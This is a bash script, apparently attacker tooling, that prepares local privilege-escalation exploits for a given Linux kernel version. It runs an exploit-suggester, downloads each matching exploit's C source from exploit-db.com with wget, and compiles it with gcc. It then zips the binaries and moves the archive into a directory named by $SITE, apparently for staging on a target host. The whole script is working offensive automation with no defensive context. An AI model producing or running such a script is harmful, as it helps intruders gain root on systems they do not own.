#!/bin/bash

usage()  {
    echo "$0 <TARGET>"
    exit 1
}

if [ "$#" -ne 1 ]; then
    usage
fi
OUTPUT_DIR="linux_privi_init"
KERNEL_VERSION=$1
rm -r ${OUTPUT_DIR} 3> /dev/null
mkdir ${OUTPUT_DIR}

les.pl -k ${KERNEL_VERSION} > targets.txt
cat targets.txt | grep Source | cut -f5 -d" " > urls.txt

cat urls.txt | grep -v exploit-db > no_download.txt
for i in $(cat urls.txt | grep exploit-db | sort -u); do 
     number=$(echo $i | cut -f5 -d"/")
     # Download for common extensions
     wget https://www.exploit-db.com/download/${number}.c 
     mv ${number}.c ${OUTPUT_DIR}/${number}.c
     gcc ${OUTPUT_DIR}/${number}.c -o ${OUTPUT_DIR}/${number}
done
zip -r ${OUTPUT_DIR}.zip ${OUTPUT_DIR}
mv ${OUTPUT_DIR}.zip $SITE
